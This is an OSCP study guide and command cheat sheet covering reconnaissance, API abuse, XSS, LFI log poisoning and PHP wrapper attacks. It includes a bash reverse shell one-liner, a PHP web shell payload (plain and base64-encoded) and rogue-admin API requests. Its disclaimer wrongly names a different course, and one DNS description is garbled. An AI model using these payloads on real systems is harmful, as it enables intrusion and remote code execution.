# OSCP-Study-Guide
Study guide and command sheet for Offensive Security PEN-200 course (Offensive Security Certified Professional - OSCP)

## Passive Information Gathering
Passive information gathering in pentesting involves collecting data about a target system or network without direct interaction, typically using tools and techniques to analyze publicly available information and detect vulnerabilities.

### Whois Enumeration
Whois is a TCP service that provides information about domain names, such as the registrar and name server, and can be used to gather valuable data like the domain registrant's identity and hosting details. Using Whois, the command demonstrates how to extract information about the domain "domain.com" from the WHOIS server, revealing its registrant information.
```bash
whois domain.com -h 192.168.123.123
```
We can also perform a reverse lookup for an IP address:
```bash
whois 31.121.117.10 -h 192.168.123.123
```

### Google Enumeration
Google Hacking, a concept popularized by Johnny Long in 2001, involves using search engines like Google with specialized search strings and operators to uncover critical information, vulnerabilities, and misconfigured websites. It starts with broad searches that are progressively refined using operators like "site," "filetype," and exclusion modifiers, enabling the discovery of sensitive information and misconfigurations, as exemplified by locating a revealing robots.txt file on the "domain.com" domain.
```bash
site:domain.com filetype:txt
```
Or we can use operants to exclude file types such as .html websites (this may reveal indexes):
```bash
site:domain.com -filetype:html
```
[References](https://www.exploit-db.com/google-hacking-database) 

### Netcraft
Netcraft is an internet service company offering a free web portal that provides passive information gathering functions, such as identifying the technologies used on a website and finding hosts sharing the same IP netblock. It allows users to gather detailed information about domains, such as "domain.com," including server registration, site history, subdomains, and technologies, which is crucial for further active information gathering and exploitation.

[Netcraft Search](https://searchdns.netcraft.com/)

### Open-Source Code
Online tools and resources can be used for passive information gathering to analyze code stored online, revealing an organization's programming languages, frameworks, and occasionally sensitive data accidentally committed to public repositories. Platforms like GitHub support advanced search operators, allowing for targeted searches within user or organization repositories, as demonstrated by finding a file named "xampp.users" containing potentially useful credentials for active attack phases.

### Shodan
Shodan is a search engine that scans and indexes internet-connected devices, including servers, routers, and IoT devices, providing detailed information like IP addresses, services, and banner data without actively interacting with the target. Unlike traditional search engines that focus on web content, Shodan reveals a target's internet footprint, including service versions and potential vulnerabilities, which is invaluable for planning active penetration testing phases.

### SSL/TLS & Security Headers
Specialty websites like Security Headers and Qualys SSL Labs can be used to assess a website or domain's security posture, offering insights into an organization's coding and security practices through analysis of HTTP response headers and SSL/TLS configurations. While Security Headers checks for defensive headers, indicating server hardening awareness, Qualys SSL Labs evaluates SSL/TLS setups against best practices, revealing vulnerabilities and outdated practices.

[Security Headers](https://securityheaders.com/)

## Active Information Gathering
Active information gathering in pentesting involves directly interacting with the target system or network, using techniques like port scanning, vulnerability scanning, and attempting to exploit identified weaknesses to obtain detailed and specific information.

### DNS Enumeration
DNS Enumeration is a critical part of information gathering in cybersecurity, focusing on translating domain names into IP addresses and exploring the hierarchical structure of DNS to identify various records and hostnames associated with a target domain. Techniques include using commands like 'host' to query different DNS record types and employing tools like DNSRecon and DNSenum for automated, extensive enumeration, as demonstrated with the domain "domain.com", which helps in revealing a target's network structure and potential vulnerabilities.
```bash
host www.domain.com
```
By specifying the -t option, we can query for specific DNS records:
```bash
host -t mx www.domain.com
```
OR
```bash
host -t txt www.domain.com
```

For automation of DNS subdomain discovery, we can utilize the following one liner:
```bash
For ip in $(cat list.txt); do host $ip.domain.com; done
```

DNS brute forcing is a technique to identify valid IP addresses associated with a given domain by systematically trying different IP addresses. This can be achieved using simple bash scripting:
```bash
for ip in $(cat list.txt); do host $ip.domain.com; done
```
This command reads IP addresses from `list.txt` and checks if they are associated with `domain.com`.

### Scanning Subdomains for Hostnames
To identify active subdomains within a specific IP range, the following script can be used:
```bash
for ip in $(seq 1 254); do host 192.168.0.$ip; done | grep -v "not found"
```
This script iterates over IP addresses in the range `192.168.0.1` to `192.168.0.254` and filters out responses with "not found".

### Automated DNS Enumeration Tools
- **DNS Recon**: An advanced Python script for DNS enumeration:
  ```bash
  dnsrecon -d domain.com -t std
  ```
- **Bruteforcing with DNSRecon**: 
  ```bash
  dnsrecon -d domain.com -D list.txt -t brt
  ```
- **DNSenum2**: A tool for enumerating DNS information from a file:
  ```bash
  dnsenum domain.txt
  ```
- **Windows NSLookup**: In Windows, the `nslookup` command can be used for DNS information retrieval.

### Port Scanning with NMAP
NMAP is a powerful tool for port scanning and network discovery:
- Default TCP scan of the top 1000 ports:
  ```bash
  sudo nmap -sT target_ip
  ```

### SMTP Enumeration
SMTP enumeration is used to validate existing users on an SMTP server:
```bash
nc -nv 192.168.0.1 25
VRFY root
VRFY testaccount
```
For automated SMTP enumeration, a Python script like `smtp.py` can be used:
```bash
python3 smtp.py johndoe 192.168.0.1
```

### SNMP Enumeration
SNMP enumeration can expose credentials and features weak authentication methods:
- Scanning for SNMP services:
  ```bash
  sudo nmap -sU --open -p 161 192.168.0.1-254 -oG open-snmp.txt
  ```
- Using OneSixtyOne for SNMP bruteforcing:
  ```bash
  for ip in $(seq 1 254); do echo 192.168.0.$ip; done > ips
  onesixtyone -c community -i ips
  ```
- SNMPWalk framework usage:
  ```bash
  snmpwalk -c public -v1 -t 10 192.168.0.1
  ```
- Commands to output SNMP users, running processes, and listening ports:
  ```bash
  snmpwalk -c public -v1 192.168.0.1 1.3.6.1.4.77.1.2.25
  snmpwalk -c public -v1 192.168.0.1 1.3.6.1.2.1.25.4.2.1.2
  snmpwalk -c public -v1 192.168.0.1 1.3.6.1.2.1.6.13.1.3
  ```

### NMAP NSE Vulnerability Scanning
NMAP's NSE scripts can be used for vulnerability scanning. However, caution is advised as some scripts can be intrusive:
- Locating vulnerability scripts:
  ```bash
  cd /usr/share/nmap/scripts
  grep "\'vuln\'" script.db
  ```
- Performing a vulnerability scan:
  ```bash
  sudo nmap -sV -p 443 --script "vuln" 192.168.0.1
  ```
  
## API Abuse and XSS Attacks
This section focuses on exploiting vulnerabilities in web applications through API abuse and Cross-Site Scripting (XSS) attacks. Understanding these techniques is crucial for identifying and exploiting weaknesses in web applications.

### Retrieving User Lists via API Abuse
API endpoints can sometimes be exploited to retrieve sensitive information such as user lists:
```bash
curl -i http://192.168.0.1:5002/users/v1
```
This command fetches a list of users from the API endpoint.

### Dumping Passwords
To check if passwords can be extracted through API abuse:
```bash
curl -i http://192.168.0.1:5002/users/v1/admin/password
```
This attempts to dump the password of the admin user.

### Registering a New Admin User
Sometimes APIs allow creating new admin users, which can be exploited:
```bash
curl -d '{"password":"test","username":"test","email":"test@domain.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.0.1:5002/users/v1/register
```
This command registers a new admin user with specified credentials.

### Obtaining Authorization Tokens
After registering, one can log in to retrieve an authorization token:
```bash
curl -X 'PUT' 'http://192.168.0.1:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0......FX5ao6ngrY' -d '{"password": "test"}'
```
This updates the password and potentially retrieves an authorization token.

### Using Proxy for HTML Response Capture
Capturing HTML responses can be done using a proxy, helpful in inspecting and modifying requests:
```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.0.1:5002/users/v1/login --proxy 127.0.0.1:8080
```
This sends the request through a proxy for analysis in tools like Burp Suite.

### Basic XSS Attack
XSS attacks can be performed by injecting script tags in user inputs:
```bash
curl -H 'User-Agent: <script>alert(42)</script>' http://target_url
```
If the server responds with 200 OK and the alert is executed, it indicates XSS vulnerability.

### Privilege Escalation via XSS
Privilege escalation can be achieved by stealing cookies via XSS:
- **Secure Flag**: Only allows transmission of cookies over HTTPS.
- **HTTPOnly Flag**: Prevents JavaScript from accessing the cookie.

Inspecting cookies in the browser's storage tab can reveal which cookies are session-related and vulnerable to theft.

## Local File Inclusion (LFI) and Log Poisoning
Local File Inclusion (LFI) vulnerabilities can be exploited to achieve Remote Code Execution (RCE) by utilizing Log Poisoning techniques. This involves injecting executable code into log files, which are then included in the application's running code, leading to the execution of the injected code.

1. **Modify the User Agent**:
   Inject a PHP code snippet into the application's log by setting a custom User Agent. The PHP code will execute any command passed to the `cmd` parameter.
   ```bash
   curl -H 'User-Agent: <?php system($_GET['cmd']); ?>' http://target_url
   ```

2. **Execute Commands**:
   Trigger the execution of the injected PHP code by including the log file in a request to the vulnerable parameter (`page`). The `cmd` parameter is used to pass commands to the PHP snippet.
   ```bash
   curl http://target_url/page=../../../../../../../path/to/logfile&cmd=whoami
   ```

This exploitation technique demonstrates how LFI vulnerabilities can lead to significant security breaches, including Remote Code Execution, by leveraging Log Poisoning.

## PHP Wrappers in File Inclusion Vulnerabilities

PHP wrappers, such as `php://filter` and `data://`, offer powerful capabilities in PHP web applications. These can be utilized to bypass filters, reveal sensitive information, or even achieve code execution when exploiting File Inclusion vulnerabilities.

### php://filter Wrapper
The `php://filter` wrapper allows the contents of files, including executable PHP files, to be displayed without execution. This is particularly useful for reviewing PHP files for sensitive information or understanding the application's logic.

#### Usage Example
1. **Display File Contents**: By providing a filename to the `page` parameter, the contents can be included and displayed. However, PHP code will be executed server-side and not shown.
    ```bash
    curl http://target_url/page=admin.php
    ```
2. **Base64 Encoding**: To view the encoded contents of PHP files, the output can be encoded with base64. This is useful for bypassing certain filters or restrictions.
    ```bash
    curl http://target_url/page=php://filter/convert.base64-encode/resource=admin.php
    ```

### data:// Wrapper
The `data://` wrapper allows embedding data elements as plain text or base64-encoded data in the running web application's code, facilitating code execution.

#### Usage Example
1. **Embedding URL-encoded PHP Snippets**: Embed a PHP snippet for execution within the application's code.
    ```bash
    curl http://target_url/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
    ```
2. **Bypassing Basic Filters with Base64 Encoding**: If certain strings or code elements are filtered, encoding the PHP snippet with base64 might help in bypassing these filters.
    ```bash
    curl http://target_url/page=data://text/plain;base64,[base64_encoded_php_snippet]
    ```

### Caution and Considerations
- The exploitation methods and examples provided are for educational purposes only.
- The `data://` wrapper requires the `allow_url_include` setting to be enabled in the PHP configuration, which is not the default setting.
- Always ensure legal and ethical considerations are adhered to when testing and exploiting vulnerabilities.


## One-Liners

### Reverse Shells
A lot of useful examples for one-liners may be found here: [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/)
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### Python
Mini server:
```bash
python3 -m http.server 8080
```

## Disclaimer and Legal Notice

### Ethical Considerations and Legal Compliance
The techniques, commands, and procedures outlined in this guide are intended solely for educational purposes and preparing for the Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP). These techniques involve methodologies that, if misused, may constitute illegal activities. Users are strongly cautioned against engaging in any unauthorized and/or unlawful actions.

### Scope of Use
- **Authorized Environments Only**: The execution of penetration testing, network attacks, and other tactics described herein should only be performed on networks and systems that are explicitly owned or authorized for testing by the user. This includes personal hardware, controlled environments, or environments for which explicit, documented permission has been granted.
- **No Unauthorized Use**: Under no circumstances should these techniques be applied to networks, systems, or devices without explicit authorization. Unauthorized use of these techniques may lead to legal consequences and is strongly condemned.

### Exam Conduct
- **Adherence to Exam Guidelines**: While this guide serves as preparation material for the OSWP exam, users must strictly adhere to the guidelines, rules, and ethical standards set forth by Offensive Security during the examination.
- **Prohibited Actions**: Any attempt to use these techniques outside of the specified exam environment, or in a manner not aligned with the exam's rules, may result in disqualification, legal action, and other serious consequences.

### Liability
- **No Responsibility for Misuse**: The authors, contributors, and associated entities of this guide accept no responsibility or liability for any misuse, damage, or illegal activities arising from the information presented. Users are solely responsible for their actions.
- **Acknowledgment of Risk**: Users acknowledge the risks involved in security testing and penetration testing and agree to ensure ethical and legal use of this information.

### Continuous Learning and Ethical Growth
- **Commitment to Ethical Hacking**: Users are encouraged to pursue knowledge in cybersecurity and ethical hacking with a strong commitment to legal compliance, ethical behavior, and respect for privacy and data protection.

By using the information in this guide, you acknowledge having read, understood, and agreed to this disclaimer and all its terms. Your use of this information indicates your acceptance of the risks and your commitment to using this knowledge responsibly and ethically.
